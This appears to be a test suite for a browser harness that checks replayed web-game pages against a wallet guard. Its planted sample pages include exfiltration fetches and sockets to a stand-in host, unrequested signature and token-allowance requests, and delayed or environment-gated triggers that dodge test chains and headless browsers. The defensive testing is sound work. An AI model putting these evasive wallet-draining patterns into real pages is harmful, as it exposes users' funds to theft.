// The harness on its own, against hand-written pages served the way the daily replay serves the live site's files
// (under the production origin, through request interception). Each test plants one behavior and asserts the layer
// of the harness that must catch it. The real play origin and the §6.1 fixtures are in layers.test.ts.
import assert from "node:assert/strict";
import { after, before, describe, test } from "node:test";
import { check, type CheckInput, guardSpans, viaGuard } from "../src/check.ts";
import type { Anvil } from "../src/util.ts";
import { DECOYS } from "../src/wallet.ts";
import { ALIASES, guardScript } from "../../web/app/_ui/guard.ts";
import { playCsp } from "../../web/security.ts";
import { chain, chromiumPath, CLOCK, FACTORY, GAME } from "./helpers.ts";

const CHROMIUM = chromiumPath();
const ORIGIN = "https://play.example.xyz";
const CLICK = "0x7d55923d";
const NONCE = "bm9uY2Vub25jZW5vbmNl";

/** A replayed game page: the guard first (unless `guard: false`), the mount marker, then `body` as a nonce'd script. */
function page(body: string, o: { guard?: boolean; mounted?: boolean; csp?: boolean } = {}) {
  const g = o.guard === false ? "" : `<script nonce="${NONCE}">${guardScript({ slug: "x", address: GAME, factory: FACTORY, selectors: [CLICK], chainId: "0x1", killUrl: "/api/kill/x" })}</script>`;
  const html = `<!doctype html><html><head>${g}</head><body>${o.mounted === false ? "" : "<div data-dna-game></div>"}<button id="b">go</button><script nonce="${NONCE}">${body}</script></body></html>`;
  const headers: Record<string, string> = o.csp === false ? {} : { "content-security-policy": playCsp(NONCE) };
  return { "/g/x": { body: html, type: "text/html", headers } };
}
const SEND = `{ method: "eth_sendTransaction", params: [{ from: "0x00000000000000000000000000000000000d0a11", to: "${GAME}", data: "${CLICK}", value: "0x0" }] }`;

describe("harness", { skip: CHROMIUM ? false : "needs a Chromium (PAGECHECK_CHROMIUM)" }, () => {
  let a: Anvil;
  let clockChain: Anvil;
  before(async () => { a = await chain(); clockChain = await chain(CLOCK); });
  after(() => { a?.stop(); clockChain?.stop(); });
  const run = (files: ReturnType<typeof page>, o: Partial<CheckInput> = {}) =>
    check({ origin: ORIGIN, slug: "x", game: GAME, factory: FACTORY, backend: { files }, rpc: a.url, chromium: CHROMIUM!, hours: 4, stepHours: 2, randoms: [0.5], profiles: undefined, rounds: 1, ...o });

  test("the decoys are the guard's alias list", () => assert.deepEqual(DECOYS, ALIASES));

  test("a clean page passes: a guarded send to the game reaches the mock wallet, on the production origin, in every profile", async () => {
    const r = await run(page(`document.getElementById("b").onclick = async () => { await ethereum.request({ method: "eth_requestAccounts" }); await ethereum.request(${SEND}); };
      if (location.origin !== "${ORIGIN}") ethereum.request({ method: "eth_sign", params: [] });`));
    assert.deepEqual(r.violations, []);
    assert.deepEqual(r.runs, ["phone@0.5", "desktop@0.5"]);
    const sends = r.requests.filter((q) => q.method === "eth_sendTransaction");
    assert.deepEqual([...new Set(sends.map((q) => q.run))], ["phone@0.5", "desktop@0.5"], "a send in each profile");
    assert.ok(sends.every((q) => q.viaGuard && q.to === GAME && q.selector === CLICK));
  });

  test("without the guard: a direct request, a decoy alias and a wallet look-alike are each caught", async () => {
    const r = await run(page(`ethereum.request({ method: "eth_chainId" }); try { window.rabby.request({ method: "eth_chainId" }); } catch (e) {}
      freshWalletProvider.request({ method: "eth_chainId" }).catch(() => {});`, { guard: false }), { profiles: undefined });
    const kinds = new Set(r.violations.map((v) => v.kind));
    for (const k of ["guard", "wallet", "decoy"]) assert.ok(kinds.has(k), `${k}: ${JSON.stringify(r.violations)}`);
    assert.ok(r.violations.some((v) => /did not come through the guard/.test(v.detail)));
    assert.ok(r.violations.some((v) => /rabby read/.test(v.detail)));
    assert.ok(r.violations.some((v) => /freshWalletProvider\.request/.test(v.detail)));
  });

  test("with the guard: aliases and look-alikes are gone before page code runs (nothing touched)", async () => {
    const r = await run(page(`if (window.rabby !== undefined || window.freshWalletProvider !== undefined || !ethereum.isDNAGuard) ethereum.request({ method: "eth_sign" });`));
    assert.deepEqual(r.violations, []);
  });

  test("anything the guard refuses counts: a signature request, a foreign target, an allowance selector", async () => {
    const r = await run(page(`ethereum.request({ method: "personal_sign", params: ["0x00", "${GAME}"] }).catch(() => {});
      ethereum.request({ method: "eth_sendTransaction", params: [{ to: "0x${"ab".repeat(20)}", data: "${CLICK}" }] }).catch(() => {});
      ethereum.request({ method: "eth_sendTransaction", params: [{ to: "${GAME}", data: "0x095ea7b3" }] }).catch(() => {});`));
    const refused = r.violations.filter((v) => v.kind === "refused").map((v) => v.detail);
    assert.ok(refused.some((d) => /^personal_sign/.test(d)));
    assert.ok(refused.some((d) => /transactions go only to this game/.test(d)));
    assert.ok(refused.some((d) => /not one of this game's functions/.test(d)));
    assert.equal(r.requests.filter((q) => q.method !== "eth_chainId").length, 0, "nothing but reads reached the wallet");
  });

  test("network: a request off the origin, a top-level navigation off it and a websocket are blocked and caught", async () => {
    const r = await run(page(`fetch("https://x.example/leak?a=1").catch(() => {}); try { new WebSocket("wss://x.example/s"); } catch (e) {}
      setTimeout(() => { location.href = "https://x.example/?a=" + 1; }, 500);`, { csp: false }));
    const net = r.violations.filter((v) => v.kind === "network").map((v) => v.detail);
    assert.ok(net.some((d) => /^fetch to https:\/\/x\.example\/leak/.test(d)), JSON.stringify(net));
    assert.ok(net.some((d) => /^navigation to https:\/\/x\.example\//.test(d)), JSON.stringify(net));
    assert.ok(net.some((d) => /^websocket wss:\/\/x\.example/.test(d)), JSON.stringify(net));
  });

  test("CSP: the play origin's policy blocks an exfil fetch and an eval, and each counts", async () => {
    const r = await run(page(`fetch("https://x.example/leak").catch(() => {}); try { Function("return 1")(); } catch (e) {}`));
    const csp = r.violations.filter((v) => v.kind === "csp").map((v) => v.detail).join("\n");
    assert.match(csp, /connect-src/);
    assert.match(csp, /report: script-src blocked eval/);
    assert.match(csp, /report: connect-src blocked https:\/\/x\.example\/leak/);
    assert.ok(!r.violations.some((v) => v.kind === "network"), "the browser blocked it before it left");
  });

  test("frames and popups: an attached frame and a new window are each caught; the frame's wallet has no guard", async () => {
    const r = await run(page(`const f = document.createElement("iframe"); f.srcdoc = "<p>x</p>"; document.body.appendChild(f);
      f.onload = () => f.contentWindow.ethereum.request(${SEND}).catch(() => {});
      document.getElementById("b").onclick = () => { open("/g/x"); };`, { csp: false }));
    const kinds = r.violations.map((v) => v.kind);
    assert.ok(kinds.includes("frame"), JSON.stringify(r.violations));
    assert.ok(kinds.includes("popup"), JSON.stringify(r.violations));
    assert.ok(r.violations.some((v) => v.kind === "wallet" && /not the top document/.test(v.detail)), JSON.stringify(r.violations));
  });

  test("time: a request due at 36 h fires inside a 48 h run (not a 24 h one), with the chain's clock in step", async () => {
    // at 36 h the page reads the chain's time through the factory and says whether both clocks agree (10 min)
    const files = page(`const t0 = Date.now(); setTimeout(async () => {
        const ts = parseInt(await ethereum.request({ method: "eth_call", params: [{ to: "${FACTORY}", data: "0x" }, "latest"] }), 16);
        const m = Math.abs(ts - Date.now() / 1000) < 600 && Date.now() - t0 >= 36 * 3600e3 ? "eth_sign" : "eth_signTypedData";
        ethereum.request({ method: m }).catch(() => {});
      }, 36 * 3600e3);`);
    const long = await run(files, { rpc: clockChain.url, hours: 48, stepHours: 6, profiles: [(await import("../src/check.ts")).PROFILES[1]] });
    assert.deepEqual(long.violations.map((v) => v.detail), ["eth_sign: not allowed on this page: eth_sign"]);
    const short = await run(files, { rpc: clockChain.url, hours: 24, stepHours: 6, profiles: [(await import("../src/check.ts")).PROFILES[1]] });
    assert.deepEqual(short.violations, [], "the timer had not come due");
  });

  test("randomness: a 1-in-100 send is found by the sweep at 0 and only there", async () => {
    const r = await run(page(`if (Math.random() < 0.01) ethereum.request({ method: "eth_sign" }).catch(() => {});
      const b = new Uint8Array(1); crypto.getRandomValues(b); if (b[0] === 255) ethereum.request({ method: "eth_signTypedData_v4" }).catch(() => {});`),
    { randoms: [0, 0.5, 1 - 2 ** -53], profiles: [(await import("../src/check.ts")).PROFILES[1]] });
    assert.deepEqual(r.violations.map((v) => `${v.run} ${v.detail.split(":")[0]}`).sort(), ["desktop@0 eth_sign", "desktop@0.9999999999999999 eth_signTypedData_v4"]);
  });

  test("a realistic profile: no webdriver flag, a regular user agent", async () => {
    const r = await run(page(`if (navigator.webdriver || /Headless/.test(navigator.userAgent)) ethereum.request({ method: "eth_sign" }).catch(() => {});`));
    assert.deepEqual(r.violations, []);
  });

  test("a page that throws while loading, and a game that never mounts, both fail", async () => {
    const t = await run(page(`throw new Error("boom");`));
    assert.ok(t.violations.some((v) => v.kind === "throws" && /boom/.test(v.detail)));
    const m = await run(page(``, { mounted: false }));
    assert.ok(m.violations.some((v) => v.kind === "not-mounted"));
  });

  test("the chain looks like mainnet: a page that acts only past block 1e6 with a real block producer is caught", async () => {
    // the game's code answers COINBASE; the page holds back on anything that looks like a test chain
    const coinbaseGame = await chain(undefined, "0x4160005260206000f3");
    try {
      const r = await run(page(`(async () => {
        const n = parseInt(await ethereum.request({ method: "eth_blockNumber" }), 16);
        const cb = await ethereum.request({ method: "eth_call", params: [{ to: "${GAME}", data: "0x" }, "latest"] });
        const [me] = await ethereum.request({ method: "eth_accounts" });
        if (n > 1e6 && !/^0x0*$/.test(cb) && me !== "0x00000000000000000000000000000000000d0a11") ethereum.request({ method: "eth_sign" }).catch(() => {});
      })();`), { rpc: coinbaseGame.url, profiles: [(await import("../src/check.ts")).PROFILES[1]] });
      assert.ok(r.violations.some((v) => /^eth_sign/.test(v.detail)), JSON.stringify(r.violations));
    } finally {
      coinbaseGame.stop();
    }
  });

  test("time: a calendar bomb read from the server's Last-Modified (after a reload) sees the simulated date", async () => {
    // first load: remember the server's date; 36 h later reload; past 30 h by the server's date: act
    const files = page(`const lm = Date.parse(document.lastModified);
      const first = Number(localStorage.getItem("first") || "0");
      if (!first) { localStorage.setItem("first", String(lm)); setTimeout(() => location.reload(), 36 * 3600e3); }
      else if (lm - first > 30 * 3600e3) ethereum.request({ method: "eth_sign" }).catch(() => {});`);
    const r = await run(files, { hours: 48, stepHours: 6, profiles: [(await import("../src/check.ts")).PROFILES[1]] });
    assert.ok(r.violations.some((v) => /^eth_sign/.test(v.detail)), JSON.stringify(r.violations));
  });

  test("a page that keeps the browser busy is a violation within the run's limit, and the next run still runs", async () => {
    const t0 = Date.now();
    // the check's budget is shared by the runs that are left: 30 s for two runs, 15 s each
    const r = await run(page(`addEventListener("load", () => setTimeout(() => { for (;;) {} }, 50));`), { budgetMs: 30_000 });
    assert.deepEqual(r.runs, ["phone@0.5", "desktop@0.5"]);
    assert.deepEqual(r.violations.filter((v) => v.kind === "timeout").map((v) => v.run), ["phone@0.5", "desktop@0.5"]);
    assert.ok(Date.now() - t0 < 60_000, "bounded by the limit, not hung");
  });

  test("the base fee keeps the head's level for the whole run: a page that acts only at a mainnet base fee late in the run is caught, at the gate and in the deep run", async () => {
    // the game's code answers BASEFEE
    const feeGame = await chain(undefined, "0x4860005260206000f3");
    const desktop = [(await import("../src/check.ts")).PROFILES[1]];
    const bomb = (afterH: number, minWei: string) => page(`setTimeout(async () => {
        const fee = BigInt(await ethereum.request({ method: "eth_call", params: [{ to: "${GAME}", data: "0x" }, "latest"] }));
        if (fee > ${minWei}n) ethereum.request({ method: "eth_sign" }).catch(() => {});
      }, ${afterH} * 3600e3);`);
    try {
      const gate = await run(bomb(46, "1000000000"), { rpc: feeGame.url, hours: 48, stepHours: 1, profiles: desktop });
      assert.ok(gate.violations.some((v) => /^eth_sign/.test(v.detail)), `gate: ${JSON.stringify(gate.violations)}`);
      const deep = await run(bomb(164, "1000000"), { rpc: feeGame.url, hours: 168, stepHours: 1, profiles: desktop });
      assert.ok(deep.violations.some((v) => /^eth_sign/.test(v.detail)), `deep: ${JSON.stringify(deep.violations)}`);
    } finally {
      feeGame.stop();
    }
  });

  test("a renderer crash is a violation, not a clean run", async () => {
    const r = await run(page(``), { profiles: [(await import("../src/check.ts")).PROFILES[1]], hook: async (p) => { await p.goto("chrome://crash").catch(() => {}); } });
    assert.ok(r.violations.some((v) => v.kind === "crash"), JSON.stringify(r.violations));
  });

  test("WebRTC is a violation (it reaches the network around the route)", async () => {
    const r = await run(page(`try { new RTCPeerConnection({ iceServers: [{ urls: "stun:x.example:3478" }] }); } catch (e) {}`, { csp: false }), { profiles: [(await import("../src/check.ts")).PROFILES[1]] });
    assert.ok(r.violations.some((v) => v.kind === "network" && /WebRTC \(RTCPeerConnection\)/.test(v.detail)), JSON.stringify(r.violations));
  });

  test("a first load that never answers is an error (the check did not run), not a kill", async () => {
    const { createServer } = await import("node:http");
    const hang = createServer(() => { /* never answers */ });
    await new Promise<void>((r) => hang.listen(0, "127.0.0.1", r));
    try {
      const r = await check({ origin: ORIGIN, slug: "x", game: GAME, factory: FACTORY, backend: { url: `http://127.0.0.1:${(hang.address() as { port: number }).port}` }, rpc: a.url, chromium: CHROMIUM!, hours: 1, randoms: [0.5], profiles: [(await import("../src/check.ts")).PROFILES[1]], loadTimeoutMs: 2_000 });
      assert.equal(r.ok, false);
      assert.match(r.error ?? "", /did not load in time/);
      assert.ok(!r.violations.some((v) => v.kind === "throws"));
    } finally {
      hang.closeAllConnections();
      hang.close();
    }
  });
});

test("viaGuard: the caller must sit inside the guard's inline script of the page's own document, top frame, guard working", () => {
  const doc = "https://play.example.xyz/g/x";
  const html = `<html><head><script nonce="n">(function g(){ isDNAGuard })()</script></head>\n<body><script>other()</script></body></html>`;
  const spans = guardSpans(html);
  assert.deepEqual(spans, [{ from: [1, 31], to: [1, 61] }]);
  const stack = (caller: string) => `Error: x\n    at Object.request (<anonymous>:1:2)\n    at ${caller}\n    at more (x)`;
  const ok = { stack: stack(`e (${doc}:1:40)`), frame: doc, top: true, guarded: true };
  assert.equal(viaGuard(ok, spans), true);
  assert.equal(viaGuard({ ...ok, stack: stack(`${doc}:1:50`) }, spans), true, "an anonymous frame inside it");
  assert.equal(viaGuard({ ...ok, stack: stack(`e (${doc}:2:10)`) }, spans), false, "another inline script");
  assert.equal(viaGuard({ ...ok, stack: stack(`e (${ORIGIN}/_next/static/chunks/a.js:1:40)`) }, spans), false, "a chunk");
  assert.equal(viaGuard({ ...ok, top: false }, spans), false);
  assert.equal(viaGuard({ ...ok, guarded: false }, spans), false);
});
